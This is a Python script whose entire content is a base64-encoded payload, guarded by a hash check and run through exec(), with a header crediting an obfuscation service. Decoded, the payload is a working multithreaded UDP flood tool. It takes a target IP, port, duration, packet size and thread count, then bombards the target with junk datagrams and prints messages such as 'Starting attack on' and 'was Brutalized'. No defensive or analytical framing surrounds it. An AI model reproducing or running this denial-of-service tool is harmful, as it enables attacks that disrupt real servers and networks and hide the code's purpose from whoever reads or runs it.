
# ENCODE BY VLADIMIR 
# Trial version
# Username Obf: @Umlaviem (7816681280)

import base64
import hashlib

expected_hash = '5899108871fb4c2f8d938e74aa5ba6b4317c8b7b674c0abd9ffb6edb57da3625'
current_hash = hashlib.sha256(base64.b64decode('aW1wb3J0IHN5cwpmcm9tIHNvY2tldCBpbXBvcnQgc29ja2V0LCBBRl9JTkVULCBTT0NLX0RHUkFNCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKZnJvbSB0aW1lIGltcG9ydCB0aW1lLCBzbGVlcApmcm9tIHB5c3R5bGUgaW1wb3J0ICoKCmNsYXNzIEJydXRhbGl6ZToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBpcCwgcG9ydCwgZm9yY2UsIHRocmVhZHMsIGR1cmF0aW9uKToKICAgICAgICBzZWxmLmlwID0gaXAKICAgICAgICBzZWxmLnBvcnQgPSBwb3J0CiAgICAgICAgc2VsZi5mb3JjZSA9IGZvcmNlICAKICAgICAgICBzZWxmLnRocmVhZHMgPSB0aHJlYWRzICAKICAgICAgICBzZWxmLmR1cmF0aW9uID0gZHVyYXRpb24gCgogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0KGZhbWlseT1BRl9JTkVULCB0eXBlPVNPQ0tfREdSQU0pCiAgICAgICAgc2VsZi5kYXRhID0gc3RyLmVuY29kZSgieCIgKiBzZWxmLmZvcmNlKQogICAgICAgIHNlbGYubGVuID0gbGVuKHNlbGYuZGF0YSkKCiAgICBkZWYgZmxvb2Qoc2VsZik6CiAgICAgICAgc2VsZi5vbiA9IFRydWUKICAgICAgICBzZWxmLnNlbnQgPSAwCiAgICAgICAgc3RhcnRfdGltZSA9IHRpbWUoKQogICAgICAgIHRocmVhZHMgPSBbXQoKICAgICAgICBmb3IgXyBpbiByYW5nZShzZWxmLnRocmVhZHMpOgogICAgICAgICAgICB0aHJlYWQgPSBUaHJlYWQodGFyZ2V0PXNlbGYuc2VuZCkKICAgICAgICAgICAgdGhyZWFkLnN0YXJ0KCkKICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodGhyZWFkKQoKICAgICAgICBpbmZvX3RocmVhZCA9IFRocmVhZCh0YXJnZXQ9c2VsZi5pbmZvKQogICAgICAgIGluZm9fdGhyZWFkLnN0YXJ0KCkKCiAgICAgICAgd2hpbGUgdGltZSgpIC0gc3RhcnRfdGltZSA8IHNlbGYuZHVyYXRpb246CiAgICAgICAgICAgIHNsZWVwKDAuMSkKICAgICAgICAKICAgICAgICBzZWxmLnN0b3AoKQoKICAgICAgICBmb3IgdGhyZWFkIGluIHRocmVhZHM6CiAgICAgICAgICAgIHRocmVhZC5qb2luKCkKICAgICAgICAKICAgICAgICBpbmZvX3RocmVhZC5qb2luKCkKCiAgICBkZWYgaW5mbyhzZWxmKToKICAgICAgICBpbnRlcnZhbCA9IDAuMDUKICAgICAgICBub3cgPSB0aW1lKCkKCiAgICAgICAgc2l6ZSA9IDAKICAgICAgICBzZWxmLnRvdGFsID0gMAoKICAgICAgICBieXRlZGlmZiA9IDgKICAgICAgICBtYiA9IDEwMDAwMDAKICAgICAgICBnYiA9IDEwMDAwMDAwMDAKCiAgICAgICAgd2hpbGUgc2VsZi5vbjoKICAgICAgICAgICAgc2xlZXAoaW50ZXJ2YWwpCiAgICAgICAgICAgIGlmIG5vdCBzZWxmLm9uOgogICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgIGlmIHNpemUgIT0gMDoKICAgICAgICAgICAgICAgIHNlbGYudG90YWwgKz0gc2VsZi5zZW50ICogYnl0ZWRpZmYgLyBnYiAqIGludGVydmFsCiAgICAgICAgICAgICAgICBwcmludChzdGFnZShmIntmbHVvfXtyb3VuZChzaXplKX0ge3doaXRlfU1iL3Mge3B1cnBsZX0te3doaXRlfSBUb3RhbDoge2ZsdW99e3JvdW5kKHNlbGYudG90YWwsIDEpfSB7d2hpdGV9R2IuIHsnICcgKiAyMH0iKSwgZW5kPSdccicpCgogICAgICAgICAgICBub3cyID0gdGltZSgpCgogICAgICAgICAgICBpZiBub3cgKyAxID49IG5vdzI6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgc2l6ZSA9IHJvdW5kKHNlbGYuc2VudCAqIGJ5dGVkaWZmIC8gbWIpCiAgICAgICAgICAgIHNlbGYuc2VudCA9IDAKCiAgICAgICAgICAgIG5vdyArPSAxCgogICAgZGVmIHN0b3Aoc2VsZik6CiAgICAgICAgc2VsZi5vbiA9IEZhbHNlCgogICAgZGVmIHNlbmQoc2VsZik6CiAgICAgICAgd2hpbGUgc2VsZi5vbjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5jbGllbnQuc2VuZHRvKHNlbGYuZGF0YSwgc2VsZi5fcmFuZGFkZHIoKSkKICAgICAgICAgICAgICAgIHNlbGYuc2VudCArPSBzZWxmLmxlbgogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgogICAgZGVmIF9yYW5kYWRkcihzZWxmKToKICAgICAgICByZXR1cm4gKHNlbGYuaXAsIHNlbGYuX3JhbmRwb3J0KCkpCgogICAgZGVmIF9yYW5kcG9ydChzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5wb3J0IG9yIHJhbmRpbnQoMSwgNjU1MzUpCgphc2NpaSA9IHInJycnJycKCmJhbm5lciA9IHIiIiIKIiIiLnJlcGxhY2UoJ+KWkycsICfiloAnKQoKYmFubmVyID0gQWRkLkFkZChhc2NpaSwgYmFubmVyLCBjZW50ZXI9VHJ1ZSkKCmZsdW8gPSBDb2wubGlnaHRfcmVkCmZsdW8yID0gQ29sLmxpZ2h0X2JsdWUKd2hpdGUgPSBDb2wud2hpdGUKCmJsdWUgPSBDb2wuU3RhdGljTUlYKChDb2wuYmx1ZSwgQ29sLmJsYWNrKSkKYnB1cnBsZSA9IENvbC5TdGF0aWNNSVgoKENvbC5wdXJwbGUsIENvbC5ibGFjaywgYmx1ZSkpCnB1cnBsZSA9IENvbC5TdGF0aWNNSVgoKENvbC5wdXJwbGUsIGJsdWUsIENvbC53aGl0ZSkpCgpkZWYgaW5pdCgpOgogICAgU3lzdGVtLlNpemUoMTQwLCA0MCkKICAgIFN5c3RlbS5UaXRsZSgiLnQuYy5wIC4tLiAuYi55LnYubC5hLmQuaS5tLmkuIi5yZXBsYWNlKCcuJywgJycpKQogICAgQ3Vyc29yLkhpZGVDdXJzb3IoKQoKaW5pdCgpCgpkZWYgc3RhZ2UodGV4dCwgc3ltYm9sPScuLi4nKToKICAgIGNvbDEgPSBwdXJwbGUKICAgIGNvbDIgPSB3aGl0ZQogICAgcmV0dXJuIGYiIHtDb2wuU3ltYm9sKHN5bWJvbCwgY29sMiwgY29sMSwgJ3snLCAnfScpfSB7Y29sMn17dGV4dH0iCgpkZWYgZXJyb3IodGV4dCwgc3RhcnQ9J1xuJyk6CiAgICBpbnB1dChmIntzdGFydH0ge0NvbC5TeW1ib2woJyEnLCBmbHVvLCB3aGl0ZSl9IHtmbHVvfXt0ZXh0fSIpCiAgICBleGl0KCkKCmRlZiBtYWluKCk6CiAgICBwcmludCgpCiAgICBwcmludChDb2xvcmF0ZS5EaWFnb25hbChDb2wuRHluYW1pY01JWCgoQ29sLndoaXRlLCBicHVycGxlKSksIENlbnRlci5YQ2VudGVyKGJhbm5lcikpKQoKICAgIGlmIGxlbihzeXMuYXJndikgIT0gNjoKICAgICAgICBwcmludCgiU+G7rSBk4bulbmc6IHB5dGhvbiB0Y3AucHkgPGlwPiA8cG9ydD4gPGR1cmF0aW9uPiA8cGFja2V0PiA8dGhyZWFkcz4iKQogICAgICAgIHN5cy5leGl0KDEpCgogICAgaXAgPSBzeXMuYXJndlsxXQogICAgdHJ5OgogICAgICAgIHBvcnQgPSBpbnQoc3lzLmFyZ3ZbMl0pCiAgICAgICAgZHVyYXRpb24gPSBpbnQoc3lzLmFyZ3ZbM10pCiAgICAgICAgZm9yY2UgPSBpbnQoc3lzLmFyZ3ZbNF0pCiAgICAgICAgdGhyZWFkcyA9IGludChzeXMuYXJndls1XSkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGVycm9yKCJFcnJvciEgUGxlYXNlIGVudGVyIGNvcnJlY3QgbnVtYmVycyBmb3IgcG9ydCwgcGFja2V0IHNpemUsIHRocmVhZHMsIGFuZCBkdXJhdGlvbi4iKQoKICAgIHByaW50KCkKICAgIGNwb3J0ID0gJycgaWYgcG9ydCBpcyBOb25lIGVsc2UgZid7cHVycGxlfTp7Zmx1bzJ9e3BvcnR9JwogICAgcHJpbnQoc3RhZ2UoZiJTdGFydGluZyBhdHRhY2sgb24ge2ZsdW8yfXtpcH17Y3BvcnR9e3doaXRlfS4iKSwgZW5kPSdccicpCgogICAgYnJ1dGUgPSBCcnV0YWxpemUoaXAsIHBvcnQsIGZvcmNlLCB0aHJlYWRzLCBkdXJhdGlvbikKICAgIHRyeToKICAgICAgICBicnV0ZS5mbG9vZCgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYnJ1dGUuc3RvcCgpCiAgICAgICAgZXJyb3IoZiJBIGZhdGFsIGVycm9yIGhhcyBvY2N1cnJlZDoge2V9IiwgJycpCiAgICAKICAgIHByaW50KHN0YWdlKGYiQXR0YWNrIGNvbXBsZXRlZC4ge2ZsdW8yfXtpcH17Y3BvcnR9e3doaXRlfSB3YXMgQnJ1dGFsaXplZCB3aXRoIHtmbHVvfXtyb3VuZChicnV0ZS50b3RhbCwgMSl9IHt3aGl0ZX1HYi4iLCAnLicpKQogICAgcHJpbnQoJ1xuJykKICAgIHNsZWVwKDEpCgogICAgaW5wdXQoc3RhZ2UoZiJQcmVzcyB7Zmx1bzJ9ZW50ZXJ7d2hpdGV9IHRvIHtmbHVvfWV4aXR7d2hpdGV9LiIsICcuJykpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigp')).hexdigest()
if current_hash != expected_hash:
    raise Exception("I am bot enc test version.")

exec(base64.b64decode('aW1wb3J0IHN5cwpmcm9tIHNvY2tldCBpbXBvcnQgc29ja2V0LCBBRl9JTkVULCBTT0NLX0RHUkFNCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKZnJvbSB0aW1lIGltcG9ydCB0aW1lLCBzbGVlcApmcm9tIHB5c3R5bGUgaW1wb3J0ICoKCmNsYXNzIEJydXRhbGl6ZToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBpcCwgcG9ydCwgZm9yY2UsIHRocmVhZHMsIGR1cmF0aW9uKToKICAgICAgICBzZWxmLmlwID0gaXAKICAgICAgICBzZWxmLnBvcnQgPSBwb3J0CiAgICAgICAgc2VsZi5mb3JjZSA9IGZvcmNlICAKICAgICAgICBzZWxmLnRocmVhZHMgPSB0aHJlYWRzICAKICAgICAgICBzZWxmLmR1cmF0aW9uID0gZHVyYXRpb24gCgogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0KGZhbWlseT1BRl9JTkVULCB0eXBlPVNPQ0tfREdSQU0pCiAgICAgICAgc2VsZi5kYXRhID0gc3RyLmVuY29kZSgieCIgKiBzZWxmLmZvcmNlKQogICAgICAgIHNlbGYubGVuID0gbGVuKHNlbGYuZGF0YSkKCiAgICBkZWYgZmxvb2Qoc2VsZik6CiAgICAgICAgc2VsZi5vbiA9IFRydWUKICAgICAgICBzZWxmLnNlbnQgPSAwCiAgICAgICAgc3RhcnRfdGltZSA9IHRpbWUoKQogICAgICAgIHRocmVhZHMgPSBbXQoKICAgICAgICBmb3IgXyBpbiByYW5nZShzZWxmLnRocmVhZHMpOgogICAgICAgICAgICB0aHJlYWQgPSBUaHJlYWQodGFyZ2V0PXNlbGYuc2VuZCkKICAgICAgICAgICAgdGhyZWFkLnN0YXJ0KCkKICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodGhyZWFkKQoKICAgICAgICBpbmZvX3RocmVhZCA9IFRocmVhZCh0YXJnZXQ9c2VsZi5pbmZvKQogICAgICAgIGluZm9fdGhyZWFkLnN0YXJ0KCkKCiAgICAgICAgd2hpbGUgdGltZSgpIC0gc3RhcnRfdGltZSA8IHNlbGYuZHVyYXRpb246CiAgICAgICAgICAgIHNsZWVwKDAuMSkKICAgICAgICAKICAgICAgICBzZWxmLnN0b3AoKQoKICAgICAgICBmb3IgdGhyZWFkIGluIHRocmVhZHM6CiAgICAgICAgICAgIHRocmVhZC5qb2luKCkKICAgICAgICAKICAgICAgICBpbmZvX3RocmVhZC5qb2luKCkKCiAgICBkZWYgaW5mbyhzZWxmKToKICAgICAgICBpbnRlcnZhbCA9IDAuMDUKICAgICAgICBub3cgPSB0aW1lKCkKCiAgICAgICAgc2l6ZSA9IDAKICAgICAgICBzZWxmLnRvdGFsID0gMAoKICAgICAgICBieXRlZGlmZiA9IDgKICAgICAgICBtYiA9IDEwMDAwMDAKICAgICAgICBnYiA9IDEwMDAwMDAwMDAKCiAgICAgICAgd2hpbGUgc2VsZi5vbjoKICAgICAgICAgICAgc2xlZXAoaW50ZXJ2YWwpCiAgICAgICAgICAgIGlmIG5vdCBzZWxmLm9uOgogICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgIGlmIHNpemUgIT0gMDoKICAgICAgICAgICAgICAgIHNlbGYudG90YWwgKz0gc2VsZi5zZW50ICogYnl0ZWRpZmYgLyBnYiAqIGludGVydmFsCiAgICAgICAgICAgICAgICBwcmludChzdGFnZShmIntmbHVvfXtyb3VuZChzaXplKX0ge3doaXRlfU1iL3Mge3B1cnBsZX0te3doaXRlfSBUb3RhbDoge2ZsdW99e3JvdW5kKHNlbGYudG90YWwsIDEpfSB7d2hpdGV9R2IuIHsnICcgKiAyMH0iKSwgZW5kPSdccicpCgogICAgICAgICAgICBub3cyID0gdGltZSgpCgogICAgICAgICAgICBpZiBub3cgKyAxID49IG5vdzI6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgc2l6ZSA9IHJvdW5kKHNlbGYuc2VudCAqIGJ5dGVkaWZmIC8gbWIpCiAgICAgICAgICAgIHNlbGYuc2VudCA9IDAKCiAgICAgICAgICAgIG5vdyArPSAxCgogICAgZGVmIHN0b3Aoc2VsZik6CiAgICAgICAgc2VsZi5vbiA9IEZhbHNlCgogICAgZGVmIHNlbmQoc2VsZik6CiAgICAgICAgd2hpbGUgc2VsZi5vbjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5jbGllbnQuc2VuZHRvKHNlbGYuZGF0YSwgc2VsZi5fcmFuZGFkZHIoKSkKICAgICAgICAgICAgICAgIHNlbGYuc2VudCArPSBzZWxmLmxlbgogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgogICAgZGVmIF9yYW5kYWRkcihzZWxmKToKICAgICAgICByZXR1cm4gKHNlbGYuaXAsIHNlbGYuX3JhbmRwb3J0KCkpCgogICAgZGVmIF9yYW5kcG9ydChzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5wb3J0IG9yIHJhbmRpbnQoMSwgNjU1MzUpCgphc2NpaSA9IHInJycnJycKCmJhbm5lciA9IHIiIiIKIiIiLnJlcGxhY2UoJ+KWkycsICfiloAnKQoKYmFubmVyID0gQWRkLkFkZChhc2NpaSwgYmFubmVyLCBjZW50ZXI9VHJ1ZSkKCmZsdW8gPSBDb2wubGlnaHRfcmVkCmZsdW8yID0gQ29sLmxpZ2h0X2JsdWUKd2hpdGUgPSBDb2wud2hpdGUKCmJsdWUgPSBDb2wuU3RhdGljTUlYKChDb2wuYmx1ZSwgQ29sLmJsYWNrKSkKYnB1cnBsZSA9IENvbC5TdGF0aWNNSVgoKENvbC5wdXJwbGUsIENvbC5ibGFjaywgYmx1ZSkpCnB1cnBsZSA9IENvbC5TdGF0aWNNSVgoKENvbC5wdXJwbGUsIGJsdWUsIENvbC53aGl0ZSkpCgpkZWYgaW5pdCgpOgogICAgU3lzdGVtLlNpemUoMTQwLCA0MCkKICAgIFN5c3RlbS5UaXRsZSgiLnQuYy5wIC4tLiAuYi55LnYubC5hLmQuaS5tLmkuIi5yZXBsYWNlKCcuJywgJycpKQogICAgQ3Vyc29yLkhpZGVDdXJzb3IoKQoKaW5pdCgpCgpkZWYgc3RhZ2UodGV4dCwgc3ltYm9sPScuLi4nKToKICAgIGNvbDEgPSBwdXJwbGUKICAgIGNvbDIgPSB3aGl0ZQogICAgcmV0dXJuIGYiIHtDb2wuU3ltYm9sKHN5bWJvbCwgY29sMiwgY29sMSwgJ3snLCAnfScpfSB7Y29sMn17dGV4dH0iCgpkZWYgZXJyb3IodGV4dCwgc3RhcnQ9J1xuJyk6CiAgICBpbnB1dChmIntzdGFydH0ge0NvbC5TeW1ib2woJyEnLCBmbHVvLCB3aGl0ZSl9IHtmbHVvfXt0ZXh0fSIpCiAgICBleGl0KCkKCmRlZiBtYWluKCk6CiAgICBwcmludCgpCiAgICBwcmludChDb2xvcmF0ZS5EaWFnb25hbChDb2wuRHluYW1pY01JWCgoQ29sLndoaXRlLCBicHVycGxlKSksIENlbnRlci5YQ2VudGVyKGJhbm5lcikpKQoKICAgIGlmIGxlbihzeXMuYXJndikgIT0gNjoKICAgICAgICBwcmludCgiU+G7rSBk4bulbmc6IHB5dGhvbiB0Y3AucHkgPGlwPiA8cG9ydD4gPGR1cmF0aW9uPiA8cGFja2V0PiA8dGhyZWFkcz4iKQogICAgICAgIHN5cy5leGl0KDEpCgogICAgaXAgPSBzeXMuYXJndlsxXQogICAgdHJ5OgogICAgICAgIHBvcnQgPSBpbnQoc3lzLmFyZ3ZbMl0pCiAgICAgICAgZHVyYXRpb24gPSBpbnQoc3lzLmFyZ3ZbM10pCiAgICAgICAgZm9yY2UgPSBpbnQoc3lzLmFyZ3ZbNF0pCiAgICAgICAgdGhyZWFkcyA9IGludChzeXMuYXJndls1XSkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGVycm9yKCJFcnJvciEgUGxlYXNlIGVudGVyIGNvcnJlY3QgbnVtYmVycyBmb3IgcG9ydCwgcGFja2V0IHNpemUsIHRocmVhZHMsIGFuZCBkdXJhdGlvbi4iKQoKICAgIHByaW50KCkKICAgIGNwb3J0ID0gJycgaWYgcG9ydCBpcyBOb25lIGVsc2UgZid7cHVycGxlfTp7Zmx1bzJ9e3BvcnR9JwogICAgcHJpbnQoc3RhZ2UoZiJTdGFydGluZyBhdHRhY2sgb24ge2ZsdW8yfXtpcH17Y3BvcnR9e3doaXRlfS4iKSwgZW5kPSdccicpCgogICAgYnJ1dGUgPSBCcnV0YWxpemUoaXAsIHBvcnQsIGZvcmNlLCB0aHJlYWRzLCBkdXJhdGlvbikKICAgIHRyeToKICAgICAgICBicnV0ZS5mbG9vZCgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYnJ1dGUuc3RvcCgpCiAgICAgICAgZXJyb3IoZiJBIGZhdGFsIGVycm9yIGhhcyBvY2N1cnJlZDoge2V9IiwgJycpCiAgICAKICAgIHByaW50KHN0YWdlKGYiQXR0YWNrIGNvbXBsZXRlZC4ge2ZsdW8yfXtpcH17Y3BvcnR9e3doaXRlfSB3YXMgQnJ1dGFsaXplZCB3aXRoIHtmbHVvfXtyb3VuZChicnV0ZS50b3RhbCwgMSl9IHt3aGl0ZX1HYi4iLCAnLicpKQogICAgcHJpbnQoJ1xuJykKICAgIHNsZWVwKDEpCgogICAgaW5wdXQoc3RhZ2UoZiJQcmVzcyB7Zmx1bzJ9ZW50ZXJ7d2hpdGV9IHRvIHtmbHVvfWV4aXR7d2hpdGV9LiIsICcuJykpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigp').decode('utf-8'))
